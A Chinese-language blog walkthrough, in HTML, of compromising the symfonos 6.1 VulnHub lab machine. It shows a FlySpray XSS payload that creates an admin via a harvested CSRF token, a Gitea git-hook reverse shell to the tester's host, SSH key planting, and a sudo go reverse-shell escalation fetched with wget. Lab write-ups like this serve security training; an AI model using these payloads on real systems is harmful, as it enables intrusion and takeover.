@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"rerestst.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="本文内容纯属虚构！ VMware工作良好，Virtualbox有问题。 靶机IP地址：192.168.31.239 测试机IP地址：192.168.31.38">
+<meta property="og:type" content="article">
+<meta property="og:title" content="symfonos 6.1_VulnHub靶机攻略">
+<meta property="og:url" content="https://rerestst.github.io/2022/12/27/symfonos%206.1_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/index.html">
+<meta property="og:site_name" content="rerestst&#39;s blog">
+<meta property="og:description" content="本文内容纯属虚构！ VMware工作良好，Virtualbox有问题。 靶机IP地址：192.168.31.239 测试机IP地址：192.168.31.38">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-12-27T14:38:43.000Z">
+<meta property="article:modified_time" content="2024-01-09T04:28:50.706Z">
+<meta property="article:author" content="rerestst">
+<meta property="article:tag" content="VulnHub">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://rerestst.github.io/2022/12/27/symfonos%206.1_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://rerestst.github.io/2022/12/27/symfonos%206.1_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/","path":"2022/12/27/symfonos 6.1_VulnHub靶机攻略/","title":"symfonos 6.1_VulnHub靶机攻略"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>symfonos 6.1_VulnHub靶机攻略 | rerestst's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">rerestst's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">4</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">14</span></a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E9%83%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">外部信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.0.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.0.2.</span> <span class="nav-text">网站目录枚举</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flyspray-XSS2CSRF"><span class="nav-number">2.</span> <span class="nav-text">flyspray XSS2CSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Gitea-RCE%E6%BC%8F%E6%B4%9ECVE-2020-14144"><span class="nav-number">3.</span> <span class="nav-text">Gitea RCE漏洞CVE-2020-14144</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%89%8B%E5%B7%A5%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.0.1.</span> <span class="nav-text">手工利用漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%A8%B3%E5%AE%9Ashell"><span class="nav-number">3.0.2.</span> <span class="nav-text">获取稳定shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%87%E6%8D%A2%E8%87%B3achilles"><span class="nav-number">3.0.3.</span> <span class="nav-text">切换至achilles</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">sudo提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">5.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#flag"><span class="nav-number">5.0.1.</span> <span class="nav-text">flag</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E9%97%AE%E9%A2%98"><span class="nav-number">5.0.2.</span> <span class="nav-text">靶机问题</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%AA%E5%81%9A%E8%A7%A3%E6%B3%95"><span class="nav-number">5.0.3.</span> <span class="nav-text">未做解法</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rerestst"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">rerestst</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://rerestst.github.io/2022/12/27/symfonos%206.1_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="rerestst">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rerestst's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="symfonos 6.1_VulnHub靶机攻略 | rerestst's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          symfonos 6.1_VulnHub靶机攻略
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-12-27 22:38:43" itemprop="dateCreated datePublished" datetime="2022-12-27T22:38:43+08:00">2022-12-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-01-09 12:28:50" itemprop="dateModified" datetime="2024-01-09T12:28:50+08:00">2024-01-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/" itemprop="url" rel="index"><span itemprop="name">靶机攻略</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>本文内容纯属虚构！</p>
+<p>VMware工作良好，Virtualbox有问题。</p>
+<p>靶机IP地址：192.168.31.239</p>
+<p>测试机IP地址：192.168.31.38</p>
+<span id="more"></span>
+
+<h3 id="外部信息收集"><a href="#外部信息收集" class="headerlink" title="外部信息收集"></a>外部信息收集</h3><p>访问<a target="_blank" rel="noopener" href="http://192.168.31.239/%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA%E5%9B%BE%E7%89%87%E3%80%82">http://192.168.31.239/只有一个图片。</a></p>
+<h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: GET HEAD POST OPTIONS TRACE</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40</span><br><span class="line">3000/tcp open  ppp?    syn-ack ttl 64</span><br><span class="line">3306/tcp open  mysql   syn-ack ttl 64 MariaDB (unauthorized)</span><br><span class="line">5000/tcp open  upnp?   syn-ack ttl 64</span><br><span class="line">5353/udp open  zeroconf</span><br></pre></td></tr></table></figure>
+
+<h5 id="网站目录枚举"><a href="#网站目录枚举" class="headerlink" title="网站目录枚举"></a>网站目录枚举</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.239/FUZZ -e .php,.txt -c -ic</span><br><span class="line">http://192.168.31.239/posts/</span><br></pre></td></tr></table></figure>
+
+<p>看起来用于博客。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.31.239/FUZZ -e .php,.txt -c -ic</span><br><span class="line">http://192.168.31.239/flyspray</span><br></pre></td></tr></table></figure>
+
+<p>看起来用于提交bug，查到是flyspray bug跟踪系统，已有一个计划处理的bug提交信息，状态中显示数量有2个（猜测其中一个需要高权限才能看到），具有登录、注册、找回密码功能，已有用户为Mr Super User，所属组为Admin</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.31.239/FUZZ -e .php,.txt -c -ic</span><br><span class="line">http://192.168.31.239/flyspray</span><br></pre></td></tr></table></figure>
+
+<p>存在目录列表。</p>
+<p>查看<a target="_blank" rel="noopener" href="http://192.168.31.239/flyspray/docs/UPGRADING.txt%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8D%87%E7%BA%A7%E8%AE%B0%E5%BD%95%EF%BC%8C%E5%BD%93%E5%89%8D%E7%89%88%E6%9C%AC%E4%B8%BA1.0">http://192.168.31.239/flyspray/docs/UPGRADING.txt程序的升级记录，当前版本为1.0</a></p>
+<h3 id="flyspray-XSS2CSRF"><a href="#flyspray-XSS2CSRF" class="headerlink" title="flyspray XSS2CSRF"></a>flyspray XSS2CSRF</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ searchsploit flyspray</span><br><span class="line">Exploit Title  |  Path</span><br><span class="line">Flyspray 0.9 - Multiple Cross-Site Scripting Vulnerabilities  | php/webapps/26400.txt</span><br><span class="line">FlySpray 0.9.7 - &#x27;install-0.9.7.php&#x27; Remote Command Execution  | php/webapps/1494.php</span><br><span class="line">Flyspray 0.9.9 - Information Disclosure/HTML Injection / Cross-Site Scripting  | php/webapps/31326.txt</span><br><span class="line">Flyspray 0.9.9 - Multiple Cross-Site Scripting Vulnerabilities  | php/webapps/30891.txt</span><br><span class="line">Flyspray 0.9.9.6 - Cross-Site Request Forgery  | php/webapps/18468.html</span><br><span class="line">FlySpray 1.0-rc4 - Cross-Site Scripting / Cross-Site Request Forgery  | php/webapps/41918.txt</span><br></pre></td></tr></table></figure>
+
+<p>查看FlySpray 1.0-rc4的漏洞，searchsploit -x 41918，</p>
+<p>&#x2F;index.php?do&#x3D;myprofile的real_name参数存在XSS，可在参数页面和任何允许用户输入评论的页面上执行。</p>
+<p>这个XSS可以用来收集CSRF token，并提交一个表单来创建一个新的管理员。修改脚本保存为exp.js：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">var tok = document.getElementsByName(&#x27;csrftoken&#x27;)[0].value;</span><br><span class="line"></span><br><span class="line">var txt = &#x27;&lt;form method=&quot;POST&quot; id=&quot;hacked_form&quot; action=&quot;index.php?do=admin&amp;area=newuser&quot;&gt;&#x27;</span><br><span class="line">txt += &#x27;&lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;admin.newuser&quot;/&gt;&#x27;</span><br><span class="line">txt += &#x27;&lt;input type=&quot;hidden&quot; name=&quot;do&quot; value=&quot;admin&quot;/&gt;&#x27;</span><br><span class="line">txt += &#x27;&lt;input type=&quot;hidden&quot; name=&quot;area&quot; value=&quot;newuser&quot;/&gt;&#x27;</span><br><span class="line">txt += &#x27;&lt;input type=&quot;hidden&quot; name=&quot;user_name&quot; value=&quot;administator&quot;/&gt;&#x27;</span><br><span class="line">txt += &#x27;&lt;input type=&quot;hidden&quot; name=&quot;csrftoken&quot; value=&quot;&#x27; + tok + &#x27;&quot;/&gt;&#x27;</span><br><span class="line">txt += &#x27;&lt;input type=&quot;hidden&quot; name=&quot;user_pass&quot; value=&quot;1234rere&quot;/&gt;&#x27;</span><br><span class="line">txt += &#x27;&lt;input type=&quot;hidden&quot; name=&quot;user_pass2&quot; value=&quot;1234rere&quot;/&gt;&#x27;</span><br><span class="line">txt += &#x27;&lt;input type=&quot;hidden&quot; name=&quot;real_name&quot; value=&quot;root&quot;/&gt;&#x27;</span><br><span class="line">txt += &#x27;&lt;input type=&quot;hidden&quot; name=&quot;email_address&quot; value=&quot;root@symfonos.com&quot;/&gt;&#x27;</span><br><span class="line">txt += &#x27;&lt;input type=&quot;hidden&quot; name=&quot;verify_email_address&quot; value=&quot;root@symfonos.com&quot;/&gt;&#x27;</span><br><span class="line">txt += &#x27;&lt;input type=&quot;hidden&quot; name=&quot;jabber_id&quot; value=&quot;&quot;/&gt;&#x27;</span><br><span class="line">txt += &#x27;&lt;input type=&quot;hidden&quot; name=&quot;notify_type&quot; value=&quot;0&quot;/&gt;&#x27;</span><br><span class="line">txt += &#x27;&lt;input type=&quot;hidden&quot; name=&quot;time_zone&quot; value=&quot;0&quot;/&gt;&#x27;</span><br><span class="line">txt += &#x27;&lt;input type=&quot;hidden&quot; name=&quot;group_in&quot; value=&quot;1&quot;/&gt;&#x27;</span><br><span class="line">txt += &#x27;&lt;/form&gt;&#x27;</span><br><span class="line"></span><br><span class="line">var d1 = document.getElementById(&#x27;menu&#x27;);</span><br><span class="line">d1.insertAdjacentHTML(&#x27;afterend&#x27;, txt);</span><br><span class="line">document.getElementById(&quot;hacked_form&quot;).submit();</span><br></pre></td></tr></table></figure>
+
+
+
+<p>测试机开启HTTP服务：$ python -m http.server 80</p>
+<p>尝试注册用户test1:12345，注册时提交有real_name参数，点击查看个人信息编辑Real Name为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testq&quot;&gt;&lt;script&gt;console.log(200)&lt;/script&gt;&lt;var xxx=&quot;</span><br></pre></td></tr></table></figure>
+
+<p>发现头像处该脚本未被编码输出。</p>
+<p>评论已有的计划处理的bug提交信息，管理员查看该信息时会触发脚本。</p>
+<p>更改real_name为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testq&quot;&gt;&lt;script src=&quot;http://192.168.31.38/exp.js&quot;&gt;&lt;/script&gt;&lt;var xxx=&quot;</span><br></pre></td></tr></table></figure>
+
+<p>观察HTTP代理流量， 发现靶机IP地址请求测试机。</p>
+<p>使用administator:1234rere登录后发现另一个计划信息，内容中包含Gitea身份认证信息：achilles:h2sBr9gryBunKdF9</p>
+<h3 id="Gitea-RCE漏洞CVE-2020-14144"><a href="#Gitea-RCE漏洞CVE-2020-14144" class="headerlink" title="Gitea RCE漏洞CVE-2020-14144"></a>Gitea RCE漏洞CVE-2020-14144</h3><p>访问<a target="_blank" rel="noopener" href="http://192.168.31.239:3000/%EF%BC%8C%E6%98%AFGitea%EF%BC%8C%E5%BD%93%E5%89%8D%E7%89%88%E6%9C%AC">http://192.168.31.239:3000/，是Gitea，当前版本</a>: 1.11.4</p>
+<p>发现用户achilles、zayotic，登录achilles后找到MySQL的认证信息root:password，尝试登录MySQL失败。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ searchsploit Gitea</span><br><span class="line">Gitea 1.12.5 - Remote Code Execution (Authenticated)           | multiple/webapps/49571.py</span><br><span class="line">Gitea 1.4.0 - Remote Code Execution             | multiple/webapps/44996.py</span><br><span class="line">Gitea 1.7.5 - Remote Code Execution             | multiple/webapps/49383.py</span><br><span class="line"></span><br><span class="line">49571.py：</span><br><span class="line">Version: &gt;= 1.1.0 to &lt;= 1.12.5，需要用户名和口令，利用漏洞需要可创建git hooks的GiTea账户，在1.13.0版本被修复。</span><br><span class="line">$ python3 49571.py -t http://192.168.31.239:3000 -u achilles -p h2sBr9gryBunKdF9 -I 192.168.31.38 -P 8088</span><br></pre></td></tr></table></figure>
+
+<p>可能测试环境原因，脚本执行报错。</p>
+<h5 id="手工利用漏洞"><a href="#手工利用漏洞" class="headerlink" title="手工利用漏洞"></a>手工利用漏洞</h5><p>通过achilles:h2sBr9gryBunKdF9登录Gitea</p>
+<p>点开一个repository，Settings -&gt; Git Hooks</p>
+<p>修改post-receive Hook</p>
+<p>写入reverse shell：bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.31.38&#x2F;8088 0&lt;&amp;1 2&gt;&amp;1</p>
+<p>测试机开启监听</p>
+<p>在repository的任意文件代码中增加个回车然后提交，触发post-receive Hook</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[git@symfonos6 symfonos-blog.git]$ id</span><br><span class="line">id</span><br><span class="line">uid=997(git) gid=995(git) groups=995(git)</span><br></pre></td></tr></table></figure>
+
+<p>发现shell很不稳定，需要将公钥复制到git的.ssh&#x2F;authorized_keys中，获得一个更稳定的shell。</p>
+<h5 id="获取稳定shell"><a href="#获取稳定shell" class="headerlink" title="获取稳定shell"></a>获取稳定shell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">测试机</span><br><span class="line">$ ssh-keygen -t rsa</span><br><span class="line">...</span><br><span class="line">$ cat id_rsa.pub</span><br><span class="line">ssh-rsa AAAAB3N...9hzeaTzQUs= kali@kali</span><br><span class="line"></span><br><span class="line">靶机：</span><br><span class="line">[git@symfonos6 symfonos-blog.git]$ pwd</span><br><span class="line">/home/git/gitea-repositories/achilles/symfonos-blog.git</span><br><span class="line">[git@symfonos6 ~]$ cd /home/git</span><br><span class="line">$ echo &quot;ssh-rsa AAAAB3N...9hzeaTzQUs= kali@kali&quot; &gt;&gt; .ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">测试机：</span><br><span class="line">$ ssh -i id_rsa git@192.168.31.239</span><br><span class="line">[git@symfonos6 ~]$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">achilles:x:1000:1000::/home/achilles:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<h5 id="切换至achilles"><a href="#切换至achilles" class="headerlink" title="切换至achilles"></a>切换至achilles</h5><p>尝试使用achilles的gitea口令h2sBr9gryBunKdF9</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[git@symfonos6 ~]$ su - achilles</span><br><span class="line">[achilles@symfonos6 ~]$ id</span><br><span class="line">uid=1000(achilles) gid=1000(achilles) groups=1000(achilles),48(apache)</span><br></pre></td></tr></table></figure>
+
+<h3 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[achilles@symfonos6 ~]$ sudo -l</span><br><span class="line">User achilles may run the following commands on symfonos6:</span><br><span class="line">    (ALL) NOPASSWD: /usr/local/go/bin/go</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reverse.go：</span><br><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (&quot;os/exec&quot;)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    exec.Command(&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/192.168.31.38/8088 0&gt;&amp;1&quot;).Run()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[achilles@symfonos6 tmp]$ wget http://192.168.31.38/reverse.go</span><br><span class="line">[achilles@symfonos6 tmp]$ sudo /usr/local/go/bin/go run reverse.go</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h5 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /root/proof.txt</span><br><span class="line">Congrats on rooting symfonos:6!</span><br></pre></td></tr></table></figure>
+
+<h5 id="靶机问题"><a href="#靶机问题" class="headerlink" title="靶机问题"></a>靶机问题</h5><p>遇到测试机的出现：验证XSS不存在，隔几分钟又存在；利用CSRF添加用户为低权限用户。</p>
+<p>需要重新导入虚拟机。</p>
+<h5 id="未做解法"><a href="#未做解法" class="headerlink" title="未做解法"></a>未做解法</h5><p>5000端口getshell。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/VulnHub/" rel="tag"># VulnHub</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/11/22/symfonos%205.2_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/" rel="prev" title="symfonos 5.2_VulnHub靶机攻略">
+                  <i class="fa fa-chevron-left"></i> symfonos 5.2_VulnHub靶机攻略
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/08/21/SickOs1.1_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/" rel="next" title="SickOs1.1_VulnHub靶机攻略">
+                  SickOs1.1_VulnHub靶机攻略 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rerestst</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  
+
+
+
+
+
